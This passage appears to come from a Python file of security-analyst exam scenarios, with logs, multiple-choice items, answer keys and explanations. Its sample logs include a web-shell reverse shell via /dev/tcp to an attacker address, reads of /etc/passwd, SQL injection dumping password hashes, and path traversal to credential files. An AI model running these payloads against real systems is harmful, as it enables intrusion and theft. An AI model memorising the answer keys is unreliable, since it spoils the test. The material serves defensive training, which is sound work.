198.51.100.66 - - [21/Oct/2026:02:17:40 +0000] "GET /uploads/thumb.php?c=cat%20/etc/passwd HTTP/1.1" 200 1844 "-" "curl/8.5.0"
198.51.100.66 - - [21/Oct/2026:02:19:58 +0000] "GET /uploads/thumb.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/198.51.100.66/4443%200%3E%261%27 HTTP/1.1" 200 0 "-" "curl/8.5.0\""""},
  {'kind': 'log', 'label': 'ss', 'cmd': 'root@web01:~# ss -tnp state established', 'body':
"""Recv-Q Send-Q   Local Address:Port     Peer Address:Port   Process
0      0          10.20.1.15:22        10.30.0.15:51120   users:(("sshd",pid=31002,fd=4))
0      0          10.20.1.15:443       10.10.5.40:52011   users:(("nginx",pid=1180,fd=12))
0      0          10.20.1.15:51022  198.51.100.66:4443    users:(("bash",pid=30791,fd=3))"""},
 ],
 'questions': [
  {'kind': 'select', 'prompt': 'Which source IP should the analyst be concerned about?',
   'options': ['198.51.100.66', '192.0.2.44', '10.10.5.23', '10.30.0.15'], 'answer': 0,
   'why': "198.51.100.66 guessed the webdev password, logged in, wrote a file into "
          "the web root and then drove it from the browser side. 192.0.2.44 is the "
          "noisiest address in the log, but every request it made returned 404: "
          "routine internet scanning that found nothing. 10.10.5.23 is the content "
          "team's normal key-based login, and 10.30.0.15 is the on-call analyst's "
          "own session."},
  {'kind': 'text', 'prompt': 'Which account was compromised?', 'answers': ['webdev'],
   'placeholder': 'username',
   'why': "The successful login at 02:14:02 is for webdev, and it used a password "
          "rather than the ED25519 key the team normally uses. The change of "
          "authentication method is itself an indicator."},
  {'kind': 'select', 'prompt': 'What is the indicator of compromise?',
   'options': ['A password brute force that succeeded, followed by a PHP web shell uploaded and executed',
               'Scanning for /wp-admin and /.env that returned 404',
               'A key-based SSH login from the office network',
               'A large file served from /about.html'],
   'answer': 0,
   'why': "thumb.php in an uploads folder, fed shell commands through a c= "
          "parameter, is a web shell. The 200 response with 1844 bytes for "
          "/etc/passwd shows commands ran and returned output. The 404 scanning "
          "never succeeded."},
  {'kind': 'select', 'prompt': 'What does the third line of the ss output show?',
   'options': ['A reverse shell from web01 back to the attacker on port 4443',
               'An inbound SSH session from the attacker',
               'The attacker downloading thumb.php',
               'nginx serving a page to the attacker'],
   'answer': 0,
   'why': "web01 initiated the connection from an ephemeral port to the attacker's "
          "port 4443, and the owning process is bash. That matches the last "
          "access-log request, which told the web shell to open an interactive "
          "shell back to 198.51.100.66."},
  {'kind': 'multi', 'obj': '3.2', 'prompt': 'Choose THREE corrective actions.',
   'options': ['Disable SSH password authentication and require keys',
               'Rotate the webdev credentials and remove thumb.php after imaging the host',
               'Restrict SSH on web01 to the office subnet and VPN',
               'Block 192.0.2.44 at the firewall',
               'Raise nginx logging to debug level',
               'Rename the uploads directory'],
   'answer': [0, 1, 2],
   'why': "Each correct action closes a link in this chain: password auth let "
          "the guessing work, the account and the shell are the attacker's current "
          "access, and SSH should never have been reachable from the internet. "
          "Image before removing the shell so the evidence survives. Blocking the "
          "404 scanner addresses an attacker who did nothing, extra logging fixes "
          "nothing, and renaming a folder changes one URL."},
 ],
},

# ---------------------------------------------------------------------------
{
 'id': 'web-logs',
 'obj': '2.4',
 'title': 'Three Servers, Three Attacks',
 'scenario':
   "Three customer-facing web applications each logged something unusual "
   "overnight. You have an access-log excerpt from each. Development needs to "
   "know what each attack was and what code or configuration change stops it.",
 'task':
   "For each server, identify the attack and the control that addresses its "
   "root cause, then answer the two follow-up questions.",
 'evidence': [
  {'kind': 'log', 'label': 'shop', 'cmd': 'shop.harborline.example — access.log', 'body':
"""203.0.113.50 - - [24/Oct/2026:01:02:11 +0000] "GET /product.php?id=14 HTTP/1.1" 200 2310 "-" "Mozilla/5.0"
203.0.113.50 - - [24/Oct/2026:01:02:19 +0000] "GET /product.php?id=14%27 HTTP/1.1" 500 512 "-" "Mozilla/5.0"
203.0.113.50 - - [24/Oct/2026:01:03:02 +0000] "GET /product.php?id=14%20ORDER%20BY%204-- HTTP/1.1" 500 512 "-" "Mozilla/5.0"
203.0.113.50 - - [24/Oct/2026:01:03:09 +0000] "GET /product.php?id=14%20ORDER%20BY%203-- HTTP/1.1" 200 2310 "-" "Mozilla/5.0"
203.0.113.50 - - [24/Oct/2026:01:04:40 +0000] "GET /product.php?id=-1%20UNION%20SELECT%20username,password_hash,email%20FROM%20customers-- HTTP/1.1" 200 48211 "-" "Mozilla/5.0\""""},
  {'kind': 'log', 'label': 'portal', 'cmd': 'portal.harborline.example — access.log', 'body':
"""198.51.100.9 - - [24/Oct/2026:02:11:05 +0000] "GET /download?file=report-q3.pdf HTTP/1.1" 200 88412 "-" "Mozilla/5.0"
198.51.100.9 - - [24/Oct/2026:02:11:31 +0000] "GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1844 "-" "Mozilla/5.0"
198.51.100.9 - - [24/Oct/2026:02:12:02 +0000] "GET /download?file=..%2F..%2Fapp%2Fconfig%2Fdatabase.yml HTTP/1.1" 200 640 "-" "Mozilla/5.0"
198.51.100.9 - - [24/Oct/2026:02:12:30 +0000] "GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1" 500 512 "-" "Mozilla/5.0\""""},
  {'kind': 'log', 'label': 'account', 'cmd': 'account.harborline.example — access.log', 'body':
"""192.0.2.18   - - [24/Oct/2026:03:40:01 +0000] "POST /api/login HTTP/1.1" 401 61 "-" "python-requests/2.32.3"
198.51.100.71 - - [24/Oct/2026:03:40:01 +0000] "POST /api/login HTTP/1.1" 401 61 "-" "python-requests/2.32.3"
203.0.113.94 - - [24/Oct/2026:03:40:02 +0000] "POST /api/login HTTP/1.1" 401 61 "-" "python-requests/2.32.3"
192.0.2.203  - - [24/Oct/2026:03:40:02 +0000] "POST /api/login HTTP/1.1" 401 61 "-" "python-requests/2.32.3"
  ... 4,180 POST /api/login from 611 distinct addresses, 03:40:01-04:12:55,
      each address trying 6-8 different usernames, one password each ...
198.51.100.140 - - [24/Oct/2026:03:51:27 +0000] "POST /api/login HTTP/1.1" 200 412 "-" "python-requests/2.32.3"
203.0.113.12  - - [24/Oct/2026:04:02:44 +0000] "POST /api/login HTTP/1.1" 200 409 "-" "python-requests/2.32.3\""""},
 ],
 'questions': [
  {'kind': 'match', 'prompt': 'Identify the attack against each server.',
   'choices': ['SQL injection', 'Directory traversal', 'Cross-site scripting',
               'Credential stuffing', 'No attack evident'],
   'items': [
     {'text': 'shop', 'answer': 'SQL injection',
      'why': "A stray quote produces a database error (500), ORDER BY probes find "
             "the column count, and a UNION SELECT pulls from the customers table. "
             "That is the textbook sequence for union-based SQL injection."},
     {'text': 'portal', 'answer': 'Directory traversal',
      'why': "Encoded ../ sequences climb out of the download folder to /etc/passwd "
             "and the application's own database config. The 500 on /etc/shadow "
             "only means the web process could not read that one file."},
     {'text': 'account', 'answer': 'Credential stuffing',
      'why': "Hundreds of addresses each try a handful of usernames with one "
             "password apiece: leaked username-password pairs replayed at scale. "
             "Brute force hammers one account; spraying tries one password across "
             "many accounts. Two 200 responses mean two accounts were taken over."},
   ]},
  {'kind': 'match', 'prompt': 'Choose the control that addresses each root cause.',
   'choices': ['Parameterized queries (prepared statements)',
               'Canonicalize the path and allow only listed file names',
               'Encode output and set a Content-Security-Policy',
               'MFA plus rate limiting and bot detection on login',
               'Block the source IP addresses'],
   'items': [
     {'text': 'shop', 'answer': 'Parameterized queries (prepared statements)',
      'why': "Binding id as a parameter means the database never treats it as SQL, "
             "whatever characters it contains. A WAF rule helps at the edge, but "
             "the fix belongs in the code."},
     {'text': 'portal', 'answer': 'Canonicalize the path and allow only listed file names',
      'why': "Resolve the requested path first, then confirm it is still inside the "
             "download directory, or better, map an ID to a known file. Filtering "
             "the literal string ../ fails against encodings like %2F."},
     {'text': 'account', 'answer': 'MFA plus rate limiting and bot detection on login',
      'why': "A correct password from a breach is useless without the second "
             "factor, and per-account and per-fingerprint limits slow the "
             "replay. Force a reset on the two compromised accounts too."},
   ]},
  {'kind': 'select', 'prompt': 'On shop, what in the log shows the UNION query returned data?',
   'options': ['The response size jumped from about 2.3 KB to 48 KB with status 200',
               'The request used GET rather than POST',
               'The earlier requests returned 500',
               'The user agent is a normal browser string'],
   'answer': 0,
   'why': "Access logs do not show response bodies, so size is your best proxy. A "
          "normal product page is 2310 bytes; the UNION request returned 48211 "
          "bytes with a 200, which fits a page padded with rows from the customers "
          "table. Treat those records as exposed."},
  {'kind': 'select', 'prompt': 'Why would blocking source addresses do little against the account attack?',
   'options': ['The requests come from hundreds of addresses, each sending only a few',
               'All the source addresses are internal',
               'The attacker used HTTPS, so addresses are hidden',
               'Blocking IPs violates the logging policy'],
   'answer': 0,
   'why': "Credential stuffing runs through large proxy pools on purpose. Six or "
          "eight attempts per address stays under any per-IP threshold, and a block "
          "list chases addresses the attacker will discard anyway."},
 ],
},

# ---------------------------------------------------------------------------
{
 'id': 'invoice-incident',
 'obj': '3.2',
 'title': 'The Remittance Invoice',
 'scenario':
   "An accounts-payable workstation, FIN-WS07 (user A. Hart), began beaconing "
   "on Monday morning. The incident lead has assembled four evidence sources "
   "and needs the key facts for the timeline, then a control for each stage of "
   "the attack so it cannot repeat.",
 'task':
   "Part 1: identify the malware executable, the command-and-control address "
   "and when the executable entered the organization. Part 2: pick one control "
   "per kill chain stage. Each control fits one stage; two will not be used.",
 'evidence': [
  {'kind': 'log', 'label': 'Mail gateway', 'body':
"""2026-03-09 08:41:12  msg-id 7f3a19c2
  from:     billing@northgate-supp1y.example  (sending host 192.0.2.150)
  to:       accounts@harborline.example
  subject:  Remittance overdue - INV-20931
  attach:   Remittance_INV-20931.zip (password-protected, 3 KB)
  scan:     archive encrypted - contents not inspected
  verdict:  DELIVERED"""},
  {'kind': 'table', 'label': 'Proxy', 'mono': True,
   'head': ['Time', 'Client', 'Method', 'URL', 'Status', 'Type / bytes'],
   'rows': [['2026-03-09 08:52:40', 'FIN-WS07', 'GET', 'http://198.51.100.84/dl/rmt.bin', '200', 'application/octet-stream 412,880'],
            ['2026-03-09 08:58:02', 'FIN-WS07', 'POST', 'https://198.51.100.84/api/v2/ping', '200', 'text/plain 214'],
            ['2026-03-09 09:03:02', 'FIN-WS07', 'POST', 'https://198.51.100.84/api/v2/ping', '200', 'text/plain 214'],
            ['2026-03-09 09:08:02', 'FIN-WS07', 'POST', 'https://198.51.100.84/api/v2/ping', '200', 'text/plain 214']]},
  {'kind': 'table', 'label': 'EDR', 'mono': True,
   'head': ['Time', 'Event', 'Detail'],
   'rows': [['08:52:31', 'Archive extracted', 'Remittance_INV-20931.zip → Remittance_INV-20931.pdf.js'],
            ['08:52:38', 'Process created', 'wscript.exe "C:\\Users\\ahart\\Downloads\\Remittance_INV-20931.pdf.js"'],
            ['08:52:44', 'File written', 'C:\\ProgramData\\RmtSync\\rmtsync.exe (by wscript.exe)'],
            ['08:52:46', 'Process created', 'C:\\ProgramData\\RmtSync\\rmtsync.exe'],
            ['08:53:02', 'Registry set', 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RmtSync']]},
  {'kind': 'table', 'label': 'File integrity', 'mono': True,
   'head': ['Action', 'Object', 'Path', 'Who', 'When'],
   'rows': [['Added', 'File', 'C:\\Users\\ahart\\Downloads\\Remittance_INV-20931.zip', 'ahart', '2026-03-09 08:47:55'],
            ['Added', 'Folder', 'C:\\ProgramData\\RmtSync', 'ahart', '2026-03-09 08:52:44'],
            ['Added', 'File', 'C:\\ProgramData\\RmtSync\\rmtsync.exe', 'ahart', '2026-03-09 08:52:44'],
            ['Modified', 'Registry', 'HKCU\\...\\CurrentVersion\\Run', 'ahart', '2026-03-09 08:53:02']]},
 ],
 'questions': [
  {'kind': 'select', 'prompt': 'What is the malware executable called on the host?',
   'options': ['rmtsync.exe', 'wscript.exe', 'Remittance_INV-20931.pdf.js', 'Remittance_INV-20931.zip'],
   'answer': 0,
   'why': "rmtsync.exe is the persistent executable: written to ProgramData, run, "
          "then registered in the Run key. The .pdf.js file is a script dropper "
          "with a double extension, wscript.exe is the legitimate Windows script "
          "host it abused, and the zip is the delivery container."},
  {'kind': 'select', 'prompt': 'What is the command-and-control address?',
   'options': ['198.51.100.84', '192.0.2.150', '10.20.4.57', '203.0.113.77'],
   'answer': 0,
   'why': "FIN-WS07 posts to 198.51.100.84 every five minutes in small, identical "
          "requests, which is beaconing. 192.0.2.150 sent the email; it belongs in "
          "the IOC list, but it is delivery infrastructure, not C2."},
  {'kind': 'select', 'prompt': 'When did the malware executable enter the organization?',
   'options': ['2026-03-09 08:52:40', '2026-03-09 08:41:12', '2026-03-09 08:52:44', '2026-03-09 08:53:02'],
   'answer': 0,
   'why': "The email at 08:41 carried a script, not the executable; the gateway "
          "could not even look inside the encrypted archive. The executable crossed "
          "the boundary when the script fetched rmt.bin through the proxy at "
          "08:52:40. 08:52:44 is when it was written to disk under its new name, "
          "and 08:53:02 is persistence."},
  {'kind': 'match', 'obj': '3.1', 'prompt': 'Part 2 — choose one control per stage.',
   'choices': ['Quarantine password-protected archives from external senders',
               'Make Notepad the default handler for .js and .vbs files',
               'Application allowlisting that blocks executables in ProgramData and user folders',
               'Proxy policy that blocks downloads and connections to raw IP addresses',
               'Longer minimum password length',
               'Full-disk encryption on finance laptops'],
   'items': [
     {'text': 'Delivery', 'answer': 'Quarantine password-protected archives from external senders',
      'why': "The gateway delivered an archive it could not inspect. Encrypted "
             "attachments from outside are a known evasion; holding them for "
             "review removes the blind spot."},
     {'text': 'Exploitation', 'answer': 'Make Notepad the default handler for .js and .vbs files',
      'why': "Double-clicking the .js file ran it in wscript.exe. With Notepad as "
             "the handler, the same click opens a text file and nothing executes."},
     {'text': 'Installation', 'answer': 'Application allowlisting that blocks executables in ProgramData and user folders',
      'why': "rmtsync.exe was written to and launched from ProgramData. Allowlisting "
             "stops unknown binaries running from user-writable paths, so the "
             "payload never starts and never reaches its Run key."},
     {'text': 'Command and Control', 'answer': 'Proxy policy that blocks downloads and connections to raw IP addresses',
      'why': "Both the download and the beacon went to a bare IP rather than a "
             "named site. Legitimate business traffic almost never does that, so a "
             "proxy rule breaks the second-stage fetch and the C2 channel."},
   ]},
 ],
},

# ---------------------------------------------------------------------------
{
 'id': 'phish-blast',
 'obj': '1.3',
 'title': 'Phishing Blast Review',
 'scenario':
   "At 08:58 a phishing email reached ten Rivermark staff. The SOC added the "
   "domain to the proxy block list at 09:24. The CISO wants the blast radius in "
   "numbers before the 10:00 bridge call.",
 'task':
   "Read the email and the three logs, then report how many people clicked, how "
   "many workstations were infected, the malware's file name, and who gave away "
   "a password.",
 'evidence': [
  {'kind': 'doc', 'label': 'Email', 'fields': [
     ['From', '"Rivermark IT Service Desk" <servicedesk@it-helpdesk-portal.net>'],
     ['Reply-To', 'rivermark-support@freemail.example'],
     ['To', 'undisclosed-recipients'],
     ['Subject', 'Action required: mailbox migration tonight'],
     ['Received', 'from mail.it-helpdesk-portal.net (203.0.113.200)'],
     ['Auth-Results', 'spf=pass smtp.mailfrom=it-helpdesk-portal.net; dkim=pass header.d=it-helpdesk-portal.net; dmarc=pass']],
   'paras': [
     "Your mailbox is scheduled to move to the new server tonight. Accounts that are not confirmed by 10:00 will be suspended.",
     "Confirm your account at http://it-helpdesk-portal.net/reset and install the PortalUpdate tool from the same page so Outlook keeps working after the move.",
  ]},
  {'kind': 'table', 'label': 'Staff',
   'head': ['User', 'Workstation', 'IP'],
   'rows': [['jdiaz', 'WS-101', '10.1.4.21'], ['kpatel', 'WS-104', '10.1.4.24'],
            ['lnguyen', 'WS-107', '10.1.4.27'], ['mreed', 'WS-110', '10.1.4.30'],
            ['tokafor', 'WS-113', '10.1.4.33'], ['sgarcia', 'WS-116', '10.1.4.36'],
            ['bwong', 'WS-119', '10.1.4.39'], ['rcole', 'WS-122', '10.1.4.42'],
            ['arivera', 'WS-125', '10.1.4.45'], ['ckim', 'WS-128', '10.1.4.48']]},
  {'kind': 'table', 'label': 'Proxy', 'mono': True,
   'caption': 'Domain added to the block list at 09:24:00',
   'head': ['Time', 'Client', 'Method', 'URL', 'Status', 'Action'],
   'rows': [['09:14:02', '10.1.4.21', 'GET', 'it-helpdesk-portal.net/reset', '200', 'allowed'],
            ['09:14:09', '10.1.4.21', 'GET', 'it-helpdesk-portal.net/files/PortalUpdate.exe', '200', 'allowed'],
            ['09:15:30', '10.1.4.27', 'GET', 'it-helpdesk-portal.net/reset', '200', 'allowed'],
            ['09:15:41', '10.1.4.27', 'GET', 'it-helpdesk-portal.net/files/PortalUpdate.exe', '200', 'allowed'],
            ['09:16:20', '10.1.4.24', 'GET', 'intranet.rivermark.example/it/mail-migration', '200', 'allowed'],
            ['09:17:12', '10.1.4.30', 'GET', 'it-helpdesk-portal.net/reset', '200', 'allowed'],
            ['09:17:40', '10.1.4.30', 'POST', 'it-helpdesk-portal.net/reset/submit', '302', 'allowed'],
            ['09:19:40', '10.1.4.33', 'GET', 'it-helpdesk-portal.net/reset', '200', 'allowed'],
            ['09:19:52', '10.1.4.33', 'GET', 'it-helpdesk-portal.net/files/PortalUpdate.exe', '200', 'allowed'],
            ['09:22:05', '10.1.4.21', 'GET', 'it-helpdesk-portal.net/reset', '200', 'allowed'],
            ['09:26:10', '10.1.4.42', 'GET', 'it-helpdesk-portal.net/reset', '403', 'blocked'],
            ['09:31:55', '10.1.4.39', 'GET', 'it-helpdesk-portal.net/reset', '403', 'blocked'],
            ['09:33:20', '10.1.4.42', 'GET', 'it-helpdesk-portal.net/reset', '403', 'blocked']]},
  {'kind': 'table', 'label': 'EDR', 'mono': True,
   'head': ['Time', 'Host', 'Event', 'Detail', 'Result'],
   'rows': [['09:14:15', 'WS-101', 'Process created', 'C:\\Users\\jdiaz\\Downloads\\PortalUpdate.exe', 'allowed'],
            ['09:14:18', 'WS-101', 'Persistence', 'Scheduled task "PortalUpdate" created', 'allowed'],
            ['09:15:47', 'WS-107', 'Process blocked', 'C:\\Users\\lnguyen\\Downloads\\PortalUpdate.exe', 'blocked, quarantined'],
            ['09:20:01', 'WS-113', 'Process created', 'C:\\Users\\tokafor\\Downloads\\PortalUpdate.exe', 'allowed'],
            ['09:20:03', 'WS-113', 'Persistence', 'Service "PortalUpdSvc" installed', 'allowed'],
            ['09:40:10', 'WS-104', 'Process created', 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', 'allowed']]},
 ],
 'questions': [
  {'kind': 'text', 'obj': '3.2', 'prompt': 'How many employees clicked the link?',
   'answers': ['6', 'six'], 'placeholder': 'number',
   'why': "Count distinct people, not requests: jdiaz (.21), lnguyen (.27), mreed "
          "(.30), tokafor (.33), rcole (.42) and bwong (.39). jdiaz and rcole each "
          "appear twice. rcole and bwong were blocked, but they still clicked, and "
          "they need the same awareness follow-up. kpatel visited the genuine "
          "intranet notice, which is the behavior you want."},
  {'kind': 'text', 'obj': '3.2', 'prompt': 'On how many workstations was the malware installed?',
   'answers': ['2', 'two'], 'placeholder': 'number',
   'why': "WS-101 and WS-113 ran PortalUpdate.exe and each created persistence. "
          "WS-107 downloaded it too, but EDR blocked and quarantined it before it "
          "ran. Three downloads, two infections."},
  {'kind': 'text', 'obj': '1.2', 'prompt': 'What is the executable file name of the malware?',
   'answers': ['portalupdate.exe'], 'placeholder': 'file name',
   'why': "PortalUpdate.exe, delivered from /files/ on the phishing site and "
          "launched from each user's Downloads folder."},
  {'kind': 'select', 'obj': '3.2', 'prompt': 'Who submitted credentials to the phishing page?',
   'options': ['mreed', 'jdiaz', 'tokafor', 'kpatel'], 'answer': 0,
   'why': "Only 10.1.4.30 sent a POST to /reset/submit, and the 302 that followed "
          "is the typical redirect after a harvested form. mreed never downloaded "
          "the tool, so this is a credential case, not a malware case: reset the "
          "password and revoke that user's sessions."},
  {'kind': 'select', 'prompt': 'SPF, DKIM and DMARC all passed. What does that tell you?',
   'options': ['Only that the attacker controls it-helpdesk-portal.net; the domain is not Rivermark\'s, which is the real indicator',
               'The message really came from Rivermark IT',
               'The gateway checks failed open and should be ignored',
               'The Reply-To address was verified as safe'],
   'answer': 0,
   'why': "Email authentication proves a message came from servers allowed to send "
          "for the domain in question. An attacker who registers a lookalike domain "
          "can pass all three. Read what the domain is: it is not rivermark.example, "
          "and the Reply-To points to a free mail service."},
 ],
},
]


# ---------------------------------------------------------------------------
# port-recon: the console's command table and the per-host questions are
# generated from one host list so the outputs and the answer key cannot drift.
# ---------------------------------------------------------------------------
HOSTS = [
 # name, ip, role, bad port, why, nmap body
 ('srv1', '10.40.8.21', 'File server', '21',
  "SMB on 445 with NetBIOS (139) and RPC (135) is a Windows file server. FTP on 21 "
  "sends credentials and files in cleartext, and the policy prohibits it.",
"""PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows"""),
 ('srv2', '10.40.8.33', 'Database server', '23',
  "PostgreSQL on 5432 makes this the database. SSH on 22 is fine; Telnet on 23 "
  "is cleartext remote administration and violates policy.",
"""PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
23/tcp   open  telnet     Linux telnetd
5432/tcp open  postgresql PostgreSQL DB 16.3 - 16.4
| ssl-cert: Subject: commonName=srv2.hq.lab
|_Not valid after:  2027-04-02T11:20:13
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel"""),
 ('srv3', '10.40.8.2', 'Network switch', '80',
  "Cisco SSH and an IOS web config interface, with the device type reported as "
  "switch, at the .2 address of the segment. Port 80 serves the configuration "
  "page itself rather than redirecting, so management traffic and the admin "
  "password cross the wire in cleartext. The same port on srv5 is allowed because "
  "it only redirects.",
"""PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      Cisco SSH 1.25 (protocol 2.0)
80/tcp  open  http     Cisco IOS http config
|_http-title: Site doesn't have a title (text/html).
| http-auth:
|_  Basic realm=level_15_access
443/tcp open  ssl/http Cisco IOS https config
Service Info: OS: IOS; Device: switch; CPE: cpe:/o:cisco:ios"""),
 ('srv4', '10.40.8.47', 'Mail server', '110',
  "SMTP on 25, submission on 587 and IMAPS on 993 make this the mail server. POP3 "
  "on 110 is the cleartext retrieval protocol and is prohibited; the secure "
  "IMAPS listener already covers clients.",
"""PORT    STATE SERVICE    VERSION
25/tcp  open  smtp       Postfix smtpd
|_smtp-commands: srv4.hq.lab, PIPELINING, SIZE 52428800, STARTTLS, ENHANCEDSTATUSCODES
110/tcp open  pop3       Dovecot pop3d
587/tcp open  smtp       Postfix smtpd
993/tcp open  ssl/imap   Dovecot imapd
Service Info: Host:  srv4.hq.lab"""),
 ('srv5', '10.40.8.50', 'Web server', '8080',
  "nginx on 443 makes this the web server, and port 80 only redirects to HTTPS, "
  "which the policy allows. Port 8080 serves a Jenkins dashboard over plain HTTP, "
  "which is HTTP on a non-80 port and a violation.",
"""PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     nginx 1.26.2
|_http-title: Did not follow redirect to https://srv5.hq.lab/
443/tcp  open  ssl/http nginx 1.26.2
|_http-title: Harborline Partner Portal
8080/tcp open  http     Jetty 10.0.20
|_http-title: Dashboard [Jenkins]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel"""),
]
ROLES = ['Database server', 'File server', 'Mail server', 'Network switch', 'Web server']


def _nmap_out(name, ip, body):
    return ("Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-25 14:02 EDT\n"
            f"Nmap scan report for {name}.hq.lab ({ip})\n"
            "Host is up (0.00038s latency).\n"
            "Not shown: 995 closed tcp ports (reset)\n"
            f"{body}\n\n"
            "Service detection performed. Please report any incorrect results at "
            "https://nmap.org/submit/ .\n"
            "Nmap done: 1 IP address (1 host up) scanned in 11.42 seconds")


def _build_port_recon():
    p = next(x for x in PBQS if x['id'] == 'port-recon')
    cmds = []
    for name, ip, role, bad, why, body in HOSTS:
        host_re = rf'({name}(\.hq\.lab)?|{ip.replace(".", r"\.")})'
        cmds.append({'match': [rf'^nmap(\s+\S+)*\s+{host_re}(\s+\S+)*$'],
                     'out': _nmap_out(name, ip, body)})
    cmds.append({'match': [r'^hosts$'],
                 'out': '  '.join(f'{h[0]}.hq.lab' for h in HOSTS)})
    term = p['evidence'][0]
    term['cmds'] = cmds
    term['miss'] = [
        {'match': [r'^nmap\b.*$'],
         'out': 'Failed to resolve the target. Try one of: '
                + ', '.join(f'{h[0]}.hq.lab' for h in HOSTS)
                + '\nWARNING: No targets were specified, so 0 hosts scanned.'},
    ]
    qs = []
    for name, ip, role, bad, why, body in HOSTS:
        qs.append({'kind': 'select', 'prompt': f'{name}.hq.lab — role',
                   'options': ROLES, 'answer': ROLES.index(role), 'fixed': True,
                   'why': why})
        qs.append({'kind': 'text', 'prompt': f'{name}.hq.lab — IP address',
                   'answers': [ip], 'placeholder': '10.40.8.x',
                   'why': f'The scan report line resolves {name}.hq.lab to {ip}.'})
        qs.append({'kind': 'text', 'prompt': f'{name}.hq.lab — non-compliant port',
                   'answers': [bad, f'{bad}/tcp'], 'placeholder': 'port',
                   'why': why})
    p['questions'] = qs


_build_port_recon()


# ---------------------------------------------------------------------------
# killchain (v2): carried over unchanged in content, expressed in the v3 shape.
# ---------------------------------------------------------------------------
KILLCHAIN = {'id': 'killchain',
 'obj': '3.1',
 'title': 'Kill Chain Reconstruction',
 'scenario': 'You are handed a finished timeline from an intrusion at a mid-size engineering firm. '
             'Seven artifacts survived in the logs. The incident lead wants them placed on the '
             'Lockheed Martin Cyber Kill Chain before the report goes out, because the remediation '
             'owner for each stage is different.',
 'task': 'Put the seven kill chain stages in order, then attribute each artifact to the stage it '
         'belongs to. Two of them are commonly placed one stage too early or too late — the '
         'distinction is what the stage actually describes, not when you first noticed it.',
 'evidence': [],
 'questions': [{'kind': 'order',
                'prompt': 'Step 1 — sequence the stages',
                'items': ['Reconnaissance',
                          'Weaponization',
                          'Delivery',
                          'Exploitation',
                          'Installation',
                          'Command and Control',
                          'Actions on Objectives'],
                'why': 'Reconnaissance, Weaponization, Delivery, Exploitation, Installation, '
                       'Command and Control, Actions on Objectives. Each stage depends on the one '
                       'before it: the weapon cannot be delivered before it is built, and nothing '
                       'persists before it first runs.'},
               {'kind': 'match',
                'prompt': 'Step 2 — attribute each artifact',
                'choices': ['Reconnaissance',
                            'Weaponization',
                            'Delivery',
                            'Exploitation',
                            'Installation',
                            'Command and Control',
                            'Actions on Objectives'],
                'items': [{'text': 'Three weeks before anything else, a single external address '
                                   "walks the company's public staff directory and pulls every "
                                   'name and job title.',
                           'answer': 'Reconnaissance',
                           'why': 'Reconnaissance is information gathering about the target, and '
                                  'it leaves no foothold behind. The giveaway is that nothing is '
                                  'delivered and nothing runs — the attacker is only learning who '
                                  'exists and what they do, which is what makes the later email '
                                  'convincing.'},
                          {'text': "A macro-enabled spreadsheet is assembled on the attacker's own "
                                   'infrastructure, pairing a loader with a finance-themed '
                                   'document.',
                           'answer': 'Weaponization',
                           'why': "Weaponization happens entirely on the attacker's side and never "
                                  'touches the victim — which is exactly why it is the stage '
                                  'defenders have no telemetry for. Coupling a payload to a '
                                  'deliverable artifact is the whole definition. If you placed '
                                  'Delivery here, ask whether the victim has seen it yet; they '
                                  'have not.'},
                          {'text': 'That spreadsheet arrives as an attachment addressed to three '
                                   'named accounts-payable staff, using their correct job titles.',
                           'answer': 'Delivery',
                           'why': 'Delivery is the transmission of the weapon to the target — '
                                  'email, web, removable media. Note it uses the titles harvested '
                                  'during reconnaissance, which is how the two stages connect. The '
                                  'email itself is delivery even though phishing is often loosely '
                                  'described as the whole attack.'},
                          {'text': 'One recipient opens the file; the macro executes and spawns a '
                                   'PowerShell process from the Office application.',
                           'answer': 'Exploitation',
                           'why': 'Exploitation is the moment the weapon fires — a vulnerability '
                                  'triggering, or a user being induced to run something. Office '
                                  'spawning PowerShell is the classic parent-child anomaly that '
                                  'marks it. Nothing persistent exists yet; kill the process now '
                                  'and the intrusion ends.'},
                          {'text': 'A scheduled task is registered that relaunches the loader '
                                   'every time the user signs in.',
                           'answer': 'Installation',
                           'why': 'Installation is persistence — the attacker arranging to survive '
                                  'a reboot or a logoff. This is the stage most often confused '
                                  'with Exploitation. The test is simple: exploitation got code '
                                  'running once, installation makes it come back.'},
                          {'text': 'The host begins reaching an external address every sixty '
                                   'seconds over HTTPS, each request under a kilobyte.',
                           'answer': 'Command and Control',
                           'why': 'Command and control is the channel back to the operator. Small, '
                                  'regular, low-volume outbound traffic is beaconing — the host '
                                  'asking for instructions. Until this works the attacker has code '
                                  'on a machine they cannot steer.'},
                          {'text': 'The finance share is archived into a single file, split, and '
                                   'uploaded over the same channel.',
                           'answer': 'Actions on Objectives',
                           'why': 'Actions on objectives is the attacker finally doing the thing '
                                  'they came for — here, exfiltration. Collection and staging '
                                  'belong to this stage too. Everything before it was setup; this '
                                  'is the loss.'}]}]}
PBQS.insert(1, KILLCHAIN)
